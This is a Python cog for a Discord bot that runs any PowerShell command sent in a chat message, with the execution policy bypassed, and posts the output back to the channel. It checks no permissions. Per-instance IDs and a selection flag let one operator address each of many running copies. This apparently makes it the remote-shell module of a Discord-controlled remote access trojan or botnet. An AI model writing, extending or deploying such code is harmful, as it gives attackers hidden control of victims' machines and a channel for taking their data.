import io
import os
import locale
import asyncio
import discord
from discord.ext import commands

class PowerShell(commands.Cog):
    def __init__(self, app: commands.Bot):
        self.bot = app

    @commands.command(name="powershell", aliases=["ps", "posh"])
    async def ps_exec(self, ctx, *, command: str):

        if not getattr(self.bot, 'is_selected', False):
            return
        
        await self.execute_logic(ctx, command)

    @commands.command(name="psrun", aliases=["psdirect"])
    async def run_psdirect(self, ctx, target_id: str, *, command: str):
        my_id = getattr(self.bot, 'port_id', 'Unknown')

        if not getattr(self.bot, 'is_selected', False):
            return
        
        if target_id != my_id:
            return

        await self.execute_logic(ctx, command)
        
    async def execute_logic(self, ctx, command: str):

        my_id = getattr(self.bot, 'port_id', 'Unknown')

        if command.strip().lower().startswith("cd"):
            try:
                target_dir = command[2:].strip()
                
                if not target_dir:
                    current_dir = os.getcwd()
                    await ctx.send(f"**[{my_id}]** Current Dir: `{current_dir}`")
                    return

                os.chdir(target_dir)
                
                new_dir = os.getcwd()
                await ctx.send(f"**[{my_id}]** Moved to: `{new_dir}`")
                
            except FileNotFoundError:
                await ctx.send(f"**[{my_id}]** Path not found.")
            except PermissionError:
                await ctx.send(f"**[{my_id}]** Permission denied.")
            except Exception as e:
                await ctx.send(f"**[{my_id}]** Error: {e}")
            return
        
        async with ctx.typing():
            try:
                ps_cmd = f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{command}"'
                proc = await asyncio.create_subprocess_shell(
                    ps_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )

                try:
                    stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=60)
                except asyncio.TimeoutError:
                    proc.kill() 
                    await ctx.send(f"**[{my_id}]** Timeout! Command took too long and was killed.")
                    return
                
                encoding = locale.getpreferredencoding() or 'utf-8'

                output = stdout.decode(encoding, errors='replace')
                error_msg = stderr.decode(encoding, errors='replace')
                final_result = output if output else error_msg

                if not final_result.strip():
                    final_result = "(No output)"

                if len(final_result) > 1950:
                    with io.BytesIO(final_result.encode('utf-8')) as file_obj:
                        file = discord.File(file_obj, filename=f"output_{my_id}.txt")
                        
                        await ctx.send(
                            f"**[{my_id}]** Output is too long. Sending as a file.", 
                            file=file
                        )
                else:
                    await ctx.send(f"**[{my_id}]** Command Result:\n ```bash\n{final_result}\n```")
            except Exception as e:
                await ctx.send(f"**[{my_id}]** Error: {e}")

async def setup(app: commands.Bot):
    await app.add_cog(PowerShell(app))